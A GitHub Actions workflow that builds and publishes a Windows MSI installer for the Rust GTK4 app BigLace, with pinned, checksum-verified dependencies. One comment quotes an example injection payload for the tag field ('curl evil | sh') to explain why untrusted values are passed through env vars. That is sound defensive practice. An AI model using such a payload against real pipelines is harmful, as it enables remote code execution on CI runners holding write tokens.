# Windows MSI pipeline.
#
# Triggered by a `repository_dispatch` from the BigCommunity build-package
# composite action (after it publishes the release for a new tag), or
# manually via workflow_dispatch. Builds biglace.exe against the gvsbuild
# prebuilt GTK4 + Libadwaita SDK, bundles the runtime DLLs alongside the
# .exe, and emits a single x64 MSI. The MSI installs perMachine into
# Program Files\BigLace, drops a Start Menu shortcut, and uninstalls
# cleanly through "Apps & features".
#
# Output: artifact `biglace-msi` containing biglace-<version>-x86_64.msi.
# When the run is tied to a tag, the MSI is also attached to that tag's
# GitHub Release so end users can download it without browsing CI runs.

name: Windows MSI

# Triggered by:
#   - repository_dispatch from the build-package composite action after it
#     publishes a release via the GitHub API. `push: tags` does NOT fire for
#     API-created tags, which is why we can't rely on it.
#   - workflow_dispatch for manual rebuilds; pass a `tag` to attach the MSI
#     to an existing release, or leave blank to build a one-off artifact.
on:
  workflow_dispatch:
    inputs:
      tag:
        description: 'Existing tag to build the MSI for (optional)'
        required: false
        type: string
  repository_dispatch:
    types: [windows-msi-build]

env:
  # Pin gvsbuild so reproducible builds don't drift when upstream cuts a new
  # release. Bump deliberately (read the gvsbuild release notes — sometimes
  # they break ABI). Latest known-good as of 2026-05.
  GVSBUILD_VERSION: '2026.4.1'
  # SHA-256 must be updated with GVSBUILD_VERSION before the runtime is shipped.
  GVSBUILD_SHA256: 'a6c3e4b222a5a699f2f33140635033124d70f5ca21f9e9fc845d76e5337530ab'
  # Rust target. Use MSVC over GNU because gvsbuild ships MSVC import libs.
  TARGET: 'x86_64-pc-windows-msvc'

jobs:
  build:
    name: Build MSI
    runs-on: windows-latest

    steps:
      # Resolve the tag we're building. Priority:
      #   1. repository_dispatch payload (from build-package after release)
      #   2. workflow_dispatch input (manual rebuild against an existing tag)
      #   3. github.ref_name (manual trigger on a branch, no tag attached)
      - name: Resolve tag
        id: resolve
        shell: bash
        # Pass the untrusted values through env, never interpolated straight
        # into the script body — a repository_dispatch payload like
        # `tag_name: '"; curl evil | sh; echo "'` would otherwise run on the
        # runner with a token that can write releases.
        env:
          PAYLOAD_TAG: ${{ github.event.client_payload.tag_name }}
          INPUT_TAG: ${{ github.event.inputs.tag }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          tag="$PAYLOAD_TAG"
          if [ -z "$tag" ]; then tag="$INPUT_TAG"; fi
          if [ -z "$tag" ]; then tag="$REF_NAME"; fi
          echo "tag=$tag" >> "$GITHUB_OUTPUT"
          echo "Resolved tag: $tag"

      # MSI ProductVersion must be numeric x.y.z (each < 65536). Derive it from
      # the tag (releases use date-based tags like 26.06.07). Without a version
      # that changes per release, MajorUpgrade never fires and every install
      # stacks as a new "BigLace" entry.
      - name: Resolve MSI version
        id: msiver
        shell: pwsh
        env:
          TAG: ${{ steps.resolve.outputs.tag }}
        run: |
          $t = $env:TAG -replace '^v',''
          $nums = [regex]::Matches($t, '\d+') | ForEach-Object { [int]$_.Value }
          $parts = @(0, 0, 0)
          for ($i = 0; $i -lt [Math]::Min(3, $nums.Count); $i++) {
              $parts[$i] = [Math]::Min(65534, $nums[$i])
          }
          $ver = "$($parts[0]).$($parts[1]).$($parts[2])"
          if ($ver -eq '0.0.0') { $ver = '1.0.0' }
          echo "version=$ver" >> $env:GITHUB_OUTPUT
          Write-Host "MSI ProductVersion: $ver"

      - name: Checkout
        uses: actions/checkout@v4
        with:
          # Build the exact source the package was tagged from. Falls back to
          # the workflow's own ref when no tag is in play (e.g. ad-hoc runs).
          ref: ${{ steps.resolve.outputs.tag }}

      # ── Rust toolchain ───────────────────────────────────────────────────
      # Stable + the MSVC target. dtolnay/rust-toolchain is the most maintained
      # action and skips a few seconds of overhead vs the official one.
      - name: Install Rust (MSVC)
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: ${{ env.TARGET }}

      - name: Cache cargo registry
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            target
          key: cargo-${{ runner.os }}-${{ hashFiles('Cargo.lock') }}
          restore-keys: cargo-${{ runner.os }}-

      # ── GTK4 + Libadwaita runtime (gvsbuild prebuilt) ────────────────────
      # gvsbuild publishes a single zip with bin/, lib/, include/, share/.
      # We extract it under a stable path so PKG_CONFIG_PATH and the link
      # search dirs in the next step can find the .pc files and import libs.
      - name: Cache gvsbuild
        id: cache-gvsbuild
        uses: actions/cache@v4
        with:
          path: C:\gtk-build\gtk\x64\release
          key: gvsbuild-${{ env.GVSBUILD_VERSION }}-x64

      - name: Download gvsbuild
        if: steps.cache-gvsbuild.outputs.cache-hit != 'true'
        shell: pwsh
        run: |
          $url = "https://github.com/wingtk/gvsbuild/releases/download/${{ env.GVSBUILD_VERSION }}/GTK4_Gvsbuild_${{ env.GVSBUILD_VERSION }}_x64.zip"
          Write-Host "Downloading $url"
          New-Item -ItemType Directory -Path C:\gtk-build\gtk\x64\release -Force | Out-Null
          Invoke-WebRequest -Uri $url -OutFile gtk4.zip -UseBasicParsing
          # Verify the archive before we trust its DLLs in the shipped MSI.
          $expected = "${{ env.GVSBUILD_SHA256 }}"
          if (-not ($expected -match '^[0-9a-fA-F]{64}$')) {
              throw "GVSBUILD_SHA256 must contain the pinned archive SHA-256."
          }
          $actual = (Get-FileHash gtk4.zip -Algorithm SHA256).Hash
          if ($actual -ne $expected.ToUpper()) {
              throw "gvsbuild checksum mismatch: expected $expected, got $actual"
          }
          Write-Host "gvsbuild checksum verified."
          Expand-Archive -Path gtk4.zip -DestinationPath C:\gtk-build\gtk\x64\release -Force
          Remove-Item gtk4.zip

      - name: Configure GTK env vars
        shell: pwsh
        run: |
          # These env exports stay alive for subsequent steps via $GITHUB_ENV.
          # PATH is critical: the build script spawned by gtk4-rs needs to see
          # `pkg-config.exe` and its `glib-compile-resources` siblings, all
          # shipped under bin/.
          $gtk = "C:\gtk-build\gtk\x64\release"
          echo "$gtk\bin" | Out-File -FilePath $env:GITHUB_PATH -Append -Encoding utf8
          echo "PKG_CONFIG_PATH=$gtk\lib\pkgconfig" | Out-File -FilePath $env:GITHUB_ENV -Append -Encoding utf8
          echo "LIB=$gtk\lib;$env:LIB" | Out-File -FilePath $env:GITHUB_ENV -Append -Encoding utf8
          echo "INCLUDE=$gtk\include;$env:INCLUDE" | Out-File -FilePath $env:GITHUB_ENV -Append -Encoding utf8
          # Point gettext-sys at gvsbuild's prebuilt libintl. Without these,
          # gettext-sys falls back to building gettext from source via an
          # MSYS2 `configure` script, which then tries to drive MSVC `cl.exe`
          # as if it were gcc and dies with "C compiler cannot create
          # executables". gvsbuild ships intl.lib / libintl.h / libintl-*.dll
          # because GLib depends on them.
          echo "GETTEXT_DIR=$gtk" | Out-File -FilePath $env:GITHUB_ENV -Append -Encoding utf8
          echo "GETTEXT_BIN_DIR=$gtk\bin" | Out-File -FilePath $env:GITHUB_ENV -Append -Encoding utf8
          echo "GETTEXT_LIB_DIR=$gtk\lib" | Out-File -FilePath $env:GITHUB_ENV -Append -Encoding utf8
          echo "GETTEXT_INCLUDE_DIR=$gtk\include" | Out-File -FilePath $env:GITHUB_ENV -Append -Encoding utf8

      # ── Build biglace.exe ────────────────────────────────────────────────
      # --no-default-features disables jemalloc (Linux/macOS only) and any
      # other host-specific defaults; --release runs the optimization profile
      # tuned in Cargo.toml (opt-level=z, panic=abort, etc.).
      - name: Build biglace.exe
        shell: pwsh
        run: |
          cargo build --release --locked --no-default-features --target ${{ env.TARGET }}

      # ── Stage runtime alongside the .exe ─────────────────────────────────
      # Copy runtime DLLs, schemas and locales into one harvested tree. The main
      # executable is declared separately in wix/main.wxs.
      - name: Stage MSI tree
        shell: pwsh
        run: |
          $stage = "target\wix-stage"
          Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
          New-Item -ItemType Directory -Path $stage -Force | Out-Null

          # GTK runtime: all DLLs the loader will resolve at startup. We copy
          # the entire bin/*.dll because picking transitive deps by hand is
          # brittle and the size delta is small (~80MB before MSI compression,
          # ~40MB after).
          Copy-Item "C:\gtk-build\gtk\x64\release\bin\*.dll" $stage

          # Compiled GSettings schemas (libadwaita reads these on init).
          $schemas = "C:\gtk-build\gtk\x64\release\share\glib-2.0\schemas"
          if (Test-Path $schemas) {
              New-Item -ItemType Directory -Path "$stage\share\glib-2.0\schemas" -Force | Out-Null
              Copy-Item "$schemas\*" "$stage\share\glib-2.0\schemas" -Recurse
          }

          # Themes: Adwaita is the libadwaita default. Without it, GTK falls
          # back to the unstyled 'hicolor' theme and icons render as missing.
          $icons = "C:\gtk-build\gtk\x64\release\share\icons"
          if (Test-Path $icons) {
              New-Item -ItemType Directory -Path "$stage\share\icons" -Force | Out-Null
              Copy-Item "$icons\Adwaita" "$stage\share\icons\Adwaita" -Recurse -ErrorAction SilentlyContinue
              Copy-Item "$icons\hicolor" "$stage\share\icons\hicolor" -Recurse -ErrorAction SilentlyContinue
          }

          # Compiled gettext catalogues from the repo. i18n::locale_dir() looks
          # for them next to biglace.exe (share\locale). Without this the whole
          # UI + tray ship English-only even though the .mo files exist in-repo.
          $locale = "usr\share\locale"
          if (Test-Path $locale) {
              New-Item -ItemType Directory -Path "$stage\share\locale" -Force | Out-Null
              Copy-Item "$locale\*" "$stage\share\locale" -Recurse
          }

          Get-ChildItem $stage -Recurse | Measure-Object -Sum Length |
              ForEach-Object { Write-Host ("Staged tree size: {0:N1} MB" -f ($_.Sum / 1MB)) }

      # ── Generate the application icon ────────────────────────────────────
      # The repo only ships an SVG; we rasterize it into a multi-resolution .ico.
      # Two-stage to dodge two pitfalls of the windows-latest runner:
      #   1) ImageMagick on the runner has no SVG decode delegate, so we can't
      #      let `magick` read the SVG directly — we render PNGs first with
      #      `rsvg-convert` (shipped by gvsbuild, already on PATH).
      #   2) PowerShell mangles ImageMagick's `(file)[0]` stack syntax; using
      #      one input PNG per size sidesteps the quoting problem entirely.
      - name: Generate biglace.ico from SVG
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $svg = "usr\share\icons\hicolor\scalable\apps\org.communitybig.biglace.svg"
          $ico = "wix\biglace.ico"
          if (-not (Test-Path $svg)) {
              Write-Error "SVG not found at $svg — required for the MSI icon."
              exit 1
          }

          $tmp = New-Item -ItemType Directory -Path "target\ico-stage" -Force
          $sizes = 16, 32, 48, 64, 128, 256
          $pngs = foreach ($s in $sizes) {
              $out = Join-Path $tmp "biglace-$s.png"
              & rsvg-convert -w $s -h $s -o $out $svg
              if ($LASTEXITCODE -ne 0) { throw "rsvg-convert failed for size $s" }
              $out
          }

          # Multi-res .ico so the icon scales cleanly in Explorer, Start Menu,
          # and the taskbar (each surface picks the closest available size).
          & magick @pngs $ico
          if ($LASTEXITCODE -ne 0) { throw "magick failed to assemble $ico" }
          if (-not (Test-Path $ico)) { throw "ICO was not produced at $ico" }
          Write-Host "Generated $ico"

      # ── WiX toolset ──────────────────────────────────────────────────────
      # cargo-wix invokes candle.exe + light.exe; we install both via the
      # official WiX 3.x bundle (also preinstalled on windows-latest, but
      # we install cargo-wix explicitly so its API is known).
      - name: Install cargo-wix
        shell: pwsh
        run: cargo install cargo-wix --locked --version 0.3.9

      # WiX 3.x (candle/light/heat) ships preinstalled on windows-latest today,
      # but that image floats to new versions and can drop preinstalled tools
      # without notice. Install a pinned WiX 3.14 when heat.exe is absent so a
      # runner-image change can't silently break the build, and expose its bin
      # on PATH for the harvest + build steps.
      - name: Ensure WiX 3
        shell: pwsh
        run: |
          if (-not (Get-Command heat.exe -ErrorAction SilentlyContinue)) {
              Write-Host "heat.exe not found; installing WiX 3.14 via choco."
              choco install wixtoolset --version 3.14.1 -y --no-progress
              $wixBin = "C:\Program Files (x86)\WiX Toolset v3.14\bin"
              if (Test-Path $wixBin) {
                  echo $wixBin | Out-File -FilePath $env:GITHUB_PATH -Append -Encoding utf8
              }
          } else {
              Write-Host "WiX already present: $((Get-Command heat.exe).Source)"
          }

      # heat.exe scans the staged tree and emits a WiX fragment listing every
      # file as a Component. The `-cg RuntimeFiles` flag groups them under the
      # ComponentGroup name our main.wxs references via ComponentGroupRef.
      - name: Harvest staged tree (heat.exe)
        shell: pwsh
        run: |
          $heat = (Get-Command heat.exe -ErrorAction Stop).Source
          & $heat dir "target\wix-stage" `
              -cg RuntimeFiles `
              -dr APPLICATIONFOLDER `
              -ag -srd -sfrag `
              -var var.StageDir `
              -out "wix\runtime.wxs"

      # ── Build the MSI ────────────────────────────────────────────────────
      # `-C -dStageDir=...` passes the variable referenced inside the harvested
      # fragment (heat emitted Source attributes like `$(var.StageDir)\foo.dll`).
      # The generated `wix\runtime.wxs` lives in cargo-wix's default source
      # folder, so cargo-wix includes it automatically. Passing it again with
      # `-I` makes candle.exe generate a duplicate runtime.wixobj.
      - name: Build MSI
        shell: pwsh
        env:
          TAG: ${{ steps.resolve.outputs.tag }}
          MSI_VERSION: ${{ steps.msiver.outputs.version }}
        run: |
          # cargo-wix already loads WixUIExtension and WixUtilExtension for both
          # candle and light. Passing either extension again causes a schema
          # collision (CNDL0125/LGHT0126).
          # --install-version overrides the Cargo.toml 1.0.0 with the numeric
          # version derived from the tag so upgrades actually replace in place.
          cargo wix `
              --no-build `
              --nocapture `
              --target ${{ env.TARGET }} `
              --install-version $env:MSI_VERSION `
              -C "-dStageDir=target\wix-stage" `
              --output "target\biglace-$env:TAG-x86_64.msi"

      - name: Upload MSI artifact
        uses: actions/upload-artifact@v4
        with:
          name: biglace-msi
          path: target/*.msi
          if-no-files-found: error
          retention-days: 30

      # ── Attach to GitHub Release ─────────────────────────────────────────
      # Always attempt to attach when we resolved a tag (repository_dispatch
      # or workflow_dispatch with a tag input). The release was already
      # created by build-package; we just upload the MSI to it.
      - name: Attach to release
        if: >-
          github.event_name == 'repository_dispatch' ||
          (github.event_name == 'workflow_dispatch' && github.event.inputs.tag != '')
        uses: softprops/action-gh-release@v2
        with:
          files: target/*.msi
          tag_name: ${{ steps.resolve.outputs.tag }}
          fail_on_unmatched_files: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
